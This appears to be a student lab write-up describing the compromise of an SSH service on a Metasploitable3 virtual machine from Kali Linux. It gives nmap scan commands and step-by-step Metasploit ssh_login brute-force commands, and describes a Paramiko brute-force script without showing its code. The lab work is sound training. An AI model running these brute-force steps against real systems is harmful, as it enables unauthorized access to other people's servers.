# Phase 1 Work
---

# Phase 1: Setup and Compromise the Service

## Overview

In this phase, we configured two virtual environments to simulate an attack scenario. The target machine (Metasploitable3) was configured with several known vulnerable services, and the attacker machine (Kali Linux) was used to compromise one of these services. The selected service for this phase was **SSH**, which was successfully compromised using both Metasploit and a custom script.

---

## 1. Environment Setup

### 🖥 Victim Environment: Metasploitable3
- **Platform:** VirtualBox on Windows
- **IP Adress**: 192.168.56.101
  ![لقطة شاشة 2025-04-29 225928](https://github.com/user-attachments/assets/3f0d03ed-c30f-46d7-a50d-3b23d42c9405)

-**Vulnerable Services Running:**
We executed the command nmap -sV 192.168.56.101 to perform a service version scan on the target machine. This allowed us to enumerate the active services and identify potential vulnerabilities, ultimately helping us select SSH as the target for exploitation.
![لقطة شاشة 2025-04-29 230118](https://github.com/user-attachments/assets/20f0d103-8a20-4df2-9e9c-70f95b7f92df)


### 💻 Attacker Environment: Kali Linux
- **Platform:** VirtualBox on Windows
- **IP Adress**: 192.168.56.102
  ![لقطة شاشة 2025-04-29 230105](https://github.com/user-attachments/assets/aba89bfb-3d89-4f8a-a34e-79832e7815d6)


#### Tools Used:
- Metasploit Framework
- Nmap
- Hydra
- Python 3 with Paramiko library
    
---

## 2. Selected Vulnerable Service

- **Targeted Service:** SSH (Port 22)  
- **Reason for Selection:** SSH on Metasploitable3 is configured with weak/default credentials, making it vulnerable to brute-force attacks or password reuse exploits.

---

## Service Enumeration

We scanned the target machine using `nmap` to identify open ports and determine which services were running.

Command used:
```
nmap -sV 192.168.56.101
```

## Task 1.1: Compromise Using Metasploit

Steps to exploit the SSH service:

1. Launch Metasploit:
   ```
   msfconsole
   ```
2. Search for the SSH login module:
   ```
   search ssh_login
   ```
3. Use the auxiliary scanner:
   ```
   use auxiliary/scanner/ssh/ssh_login
   ```
4. Configure the module:
   ```
   set RHOSTS 192.168.56.101
   set USER_FILE user.txt
   set PASS_FILE pass.txt
   run
   ```
5. Successful login confirms service compromise.

## Task 1.2 – Compromise Using Custom Script

- Developed a **Python script** that:
  - Brute-forces SSH login using a small credentials list.
  - Connects to the target and verifies access.
  - Outputs a success message upon successful login.

- Utilized the `paramiko` library for SSH connections.
- Demonstrated successful login to the victim system using weak credentials.

---

## 5. Conclusion

We successfully exploited the SSH service running on Metasploitable3 using:
1. **Metasploit**, leveraging known default credentials.
2. A **custom Python script**, automating the brute-force and login process.



